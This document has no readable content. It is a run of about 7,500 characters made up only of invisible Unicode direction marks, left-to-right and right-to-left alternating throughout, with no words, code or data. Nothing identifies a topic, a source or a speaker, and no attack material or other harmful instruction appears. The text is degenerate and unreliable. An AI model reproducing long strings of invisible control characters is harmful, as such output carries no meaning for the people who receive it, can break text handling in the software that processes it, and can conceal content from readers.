‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎